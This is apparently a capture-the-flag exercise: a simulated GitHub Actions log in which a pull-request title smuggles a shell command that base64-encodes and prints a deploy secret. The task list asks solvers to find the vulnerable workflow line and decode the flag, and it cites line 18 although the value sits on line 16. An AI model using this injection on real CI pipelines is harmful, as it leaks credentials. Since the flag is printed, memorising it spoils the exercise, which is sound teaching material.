@@ -1,0 +1,35 @@
+# GitHub Actions — Build Log
+# Workflow: CI Pipeline
+# PR #47 — "Fix button alignment"  (malicious title — injected payload)
+# Runner: ubuntu-latest
+# Timestamp: 2026-06-13T09:14:02Z
+
+##[group]Run Log PR metadata
+  echo "Running CI for PR by: ext-contributor"
+  echo "Branch: fix/button-alignment"
+  echo "PR Title: Fix button alignment"; echo $DEPLOY_SECRET | base64 > /tmp/.x; cat /tmp/.x
+
+##[endgroup]
+Running CI for PR by: ext-contributor
+Branch: fix/button-alignment
+PR Title: Fix button alignment
+RkxBR3tHSHRodWJfQWN0aW9uc19JbmplY3Rpb259Cg==
+
+##[group]Run Install dependencies
+npm warn deprecated ...
+added 847 packages in 12s
+##[endgroup]
+
+##[group]Run tests
+PASS src/components/Button.test.js
+##[endgroup]
+
+# ---------------------------------------------------------------------------
+# CHALLENGE TASK
+# ---------------------------------------------------------------------------
+# 1. Open workflow.yml — find the EXACT vulnerable line (write it in solve.py)
+# 2. Explain WHY it is injectable (write 1 sentence in solve.py)
+# 3. The attacker's injected payload caused the runner to print a base64 value.
+#    That value is on line 18 of this file.
+#    Decode it to get the flag.
+# ---------------------------------------------------------------------------
